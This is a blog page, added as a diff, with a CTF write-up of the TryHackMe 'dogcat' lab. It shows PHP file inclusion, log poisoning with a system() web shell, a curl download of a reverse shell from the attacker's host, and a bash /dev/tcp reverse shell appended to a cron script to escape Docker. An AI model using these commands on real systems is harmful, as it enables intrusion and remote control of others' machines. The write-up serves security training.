@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display&display=swap" rel="stylesheet"> 
+<link rel="icon" href="/seifallahhomrani1.github.io/assets/images/favicon.ico">
+
+<title>TryHackMe: Dogcat WriteUp | Seif-Allah's Blog</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>TryHackMe: Dogcat WriteUp | Seif-Allah’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="TryHackMe: Dogcat WriteUp" />
+<meta name="author" content="Seif-Allah" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TryHackMe: WriteUp for the ‘dogcat’ room (Level: Medium)" />
+<meta property="og:description" content="TryHackMe: WriteUp for the ‘dogcat’ room (Level: Medium)" />
+<meta property="og:site_name" content="Seif-Allah’s Blog" />
+<meta property="og:image" content="/seifallahhomrani1.github.io/assets/images/writeups/thm/dogcat/dogcat.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-14T00:00:00+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/seifallahhomrani1.github.io/assets/images/writeups/thm/dogcat/dogcat.png" />
+<meta property="twitter:title" content="TryHackMe: Dogcat WriteUp" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/seifallahhomrani1.github.io/assets/images/cover.png"},"name":"Seif-Allah"},"image":"/seifallahhomrani1.github.io/assets/images/writeups/thm/dogcat/dogcat.png","url":"/seifallahhomrani1.github.io/THM-dogcat/","headline":"TryHackMe: Dogcat WriteUp","dateModified":"2020-11-14T00:00:00+01:00","datePublished":"2020-11-14T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/seifallahhomrani1.github.io/THM-dogcat/"},"author":{"@type":"Person","name":"Seif-Allah"},"description":"TryHackMe: WriteUp for the ‘dogcat’ room (Level: Medium)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/seifallahhomrani1.github.io/assets/css/prism.css" rel="stylesheet">
+
+<link href="/seifallahhomrani1.github.io/assets/css/theme.css" rel="stylesheet">
+
+<script src="/seifallahhomrani1.github.io/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/seifallahhomrani1.github.io/">Home</a></li>
+        <li><a  href="/seifallahhomrani1.github.io/contact">Contact</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Python">Python</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Java">Java</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#CTF-WriteUp">CTF-WriteUp</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Articles">Articles</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Networking">Networking</a></li>    
+        <li><a href="/seifallahhomrani1.github.io/categories#Databases">Databases</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Django">Django</a></li>     
+        <li><a href="/seifallahhomrani1.github.io/categories#Linux">Linux</a></li>     
+    </ul>   
+</nav>
+
+<script src="/seifallahhomrani1.github.io/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/seifallahhomrani1.github.io/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/seifallahhomrani1.github.io/">
+        <img src="/seifallahhomrani1.github.io/assets/images/cover.png" alt="Seif-Allah's Blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">TryHackMe: Dogcat WriteUp</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+            
+        </div>            
+        <div>
+        Written by <a target="_blank" class="text-dark" href="seifallahhomrani1.social">Seif-Allah</a> on 
+        <span class="post-date"><time class="post-date" datetime="2020-11-14">14 Nov 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/seifallahhomrani1.github.io//assets/images/writeups/thm/dogcat/dogcat.png" alt="TryHackMe: Dogcat WriteUp">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Link : <a href="https://tryhackme.com/room/dogcat">dogcat room</a></p>
+
+<p>Welcome, Welcome, Welcome and welcome !</p>
+
+<h3 id="introduction">Introduction</h3>
+<p>After finishing <a href="">lfi basics room</a>, and learning some new lfi stuff, I chose this room to practice my new skill, and I absolutely recommend it!</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<hr />
+<pre><code class="language-bash">PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
+|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
+|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
+80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.38 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: dogcat
+</code></pre>
+<p>Nothing fancy here, there’s a web server running on port 80, let’s check it!</p>
+
+<p><img src="/assets/images/writeups/thm/dogcat/homepage.png" alt="homepage" /></p>
+
+<p>Basically, it’s a web app that choose randomly a cat or a dog image based on user choice (images are stored inside a dog and cat folders - look at the source).</p>
+
+<p>The user choice (cat | dog) are passed to the server through the <em>view</em> variable (look at the url), so what if we enter something other than dog or cat ? for example <em>ls</em></p>
+<hr />
+<pre><code class="language-html">Sorry, only dogs or cats are allowed.
+</code></pre>
+<hr />
+<p>So only dogs or cats allowed ? lets try <em>dog;ls</em> ?</p>
+<hr />
+<pre><code class="language-html">Warning: include(dog;ls.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
+
+Warning: include(): Failed opening 'dog;ls.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
+</code></pre>
+<p>humm ! so there’s an include function running inside the <em>/var/www/html/index.php</em> file that failed to open <em>days;ls.php</em> file.</p>
+
+<p>I think it’s time for some <a href="https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi">lfi</a> now !</p>
+
+<p>First things first, I used the null byte character : %00
+The result was :</p>
+<hr />
+<pre><code class="language-bash">Warning: include(): Failed opening 'dog;ls' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
+</code></pre>
+<p>so we get rid of the first warning which means that :</p>
+<ul>
+  <li>the program concatenate .php extension at the end of the input unless it’s dog or cat.</li>
+</ul>
+
+<p>Ok, let’s <em>directory traversal</em> :</p>
+<hr />
+<pre><code class="language-html">“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”
+Result after decoding : 
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;dogcat&lt;/title&gt;
+    &lt;link rel="stylesheet" type="text/css" href="/style.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt;dogcat&lt;/h1&gt;
+    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;
+
+    &lt;div&gt;
+        &lt;h2&gt;What would you like to see?&lt;/h2&gt;
+        &lt;a href="/?view=dog"&gt;&lt;button id="dog"&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href="/?view=cat"&gt;&lt;button id="cat"&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        &lt;?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+         &lt;!-- the site checks if ext variable is set, if not it assigns it .php   --&gt;
+	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>html comment is my explanation of the code.</p>
+
+<h3 id="lfi-to-rce-via-controlled-log-file">LFI to RCE via controlled log file</h3>
+<p>Like mentioned <a href="https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi">here</a>, I did a request to the server (in our case Apache) and include the log file (/var/log/apache2/access.log&amp;ext). Reading the log file, it looks like we can insert a php script inside the user agent header since it’s not manipulated(10.4.14.245 - - [14/Nov/2020:17:13:34 +0000] “GET / HTTP/1.1” 200 537 “-“ “Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0” 10.4.14.245 -), so I inserted this code :</p>
+<hr />
+<pre><code class="language-php">&lt;?php system($_GET['cmd']);?&gt;
+</code></pre>
+<hr />
+<p>and then started a web server on my local host to host a reverse shell file and used wget command to save it inside a temporary file to finally get a reverse shell !</p>
+<hr />
+<pre><code class="language-php">/?view=./dog/../../../../../../../var/log/apache2/access.log&amp;ext&amp;cmd=curl http://MY-IP:80/reverse.php &gt; /tmp/reverse.php
+</code></pre>
+<hr />
+<p>After that, I used chmod to make it executable and started a listener in my local host and running the file from the browser
+BOOM!! I got the reverse shell !</p>
+<hr />
+<pre><code class="language-bash">root@kali:~/Documents/thm/startup# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.4.14.245] from (UNKNOWN) [10.10.129.131] 46518
+Linux 571f0aa7aca9 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
+ 18:05:41 up 55 min,  0 users,  load average: 0.23, 0.11, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+<p>Spawning a tty shell using <em>/bin/bash -i</em> command, and looking at the user directory we can find the 2nd flag. 
+The first flag was inside the <em>/var/www/html/</em> directory. (We could retrieve it by running view=flag in the url, anyway)
+Now we need to escalate our privileges.</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Running sudo -l command, it looks like we can <em>env</em> as root, checking [gtfobins] as always and yeah we can escalate our privileges to root by running :
+<em>sudo env /bin/sh</em>, easy!
+We can now retrieve the 3rd flag from root directory.</p>
+
+<p>But now !! THE FUN BEGIN</p>
+
+<h3 id="breaking-docker-locker">Breaking DOCKER LOCKER</h3>
+<p>The 4th flag was really hard to get for me, I didn’t face any of these kinda flags before but it was kinda fun to get it !</p>
+
+<p>By looking at this <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">article</a> from the famous Vickie Lie, and the docker tag from the room cover, I check /proc/1/cgroup file to check if we are inside a docker container or not.</p>
+
+<p>So I manually enumerated the machine, looking for elements that could help me escape the container such as a script via the find / -type f -name *.sh command because nothing of the tricks found helped me, the first result is the file /opt/backups/backup.sh, hum interesting, looking at its contents :</p>
+<pre><code class="language-bash">#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+</code></pre>
+<p>From what it looks like, basically it’s a cronjob that backup the container, and since it’s writeable, let’s add a reverse shell, start a listener and wait for it to be executed.</p>
+<hr />
+<pre><code class="language-bash">echo "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/1234 0&gt;&amp;1'" &gt;&gt; backup.sh
+</code></pre>
+<hr />
+<p>After few minutes we get a reverse shell from the parent host and we can easily get flag4.txt !</p>
+
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>This room rocks ! I absolutely recommend for all beginners like me ! 
+Huge thanks to <a href="https://tryhackme.com/p/jammy">jammy</a> !</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=TryHackMe: Dogcat WriteUp&url=/seifallahhomrani1.github.io/THM-dogcat/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/seifallahhomrani1.github.io/THM-dogcat/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/seifallahhomrani1.github.io/THM-dogcat/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/categories#CTF-WriteUp">CTF-WriteUp</a>                
+    
+
+    <!-- Tags -->  
+    
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/LOS-goblin/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/los/goblin.png" alt="Lord Of SQLi : goblin Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/LOS-goblin/">Lord Of SQLi : goblin Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">05 Jan 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/LOS-gremlin/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/los/sql1.png" alt="Lord Of SQLi : gremlin Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/LOS-gremlin/">Lord Of SQLi : gremlin Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">03 Jan 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/THM-Chill-Hack/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/thm/chillhack/chillhack.png" alt="TryHackMe: Chill Hack WriteUp - PART 1"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/THM-Chill-Hack/">TryHackMe: Chill Hack WriteUp - PART 1</a>
+                
+            </h2>
+            <h4 class="card-text">TryHackMe: WriteUp for the Chill Hack room (Level: Medium)</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">18 Dec 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+
+                <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                    Copyright © 2021 Seif-Allah's Blog 
+                </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">
+                Made with love by    
+                <a target="_blank" href="fb.com/seifallahhomrani1">Seif-Allah</a>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/seifallahhomrani1.github.io/assets/js/prism.js"></script>
+
+<script src="/seifallahhomrani1.github.io/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
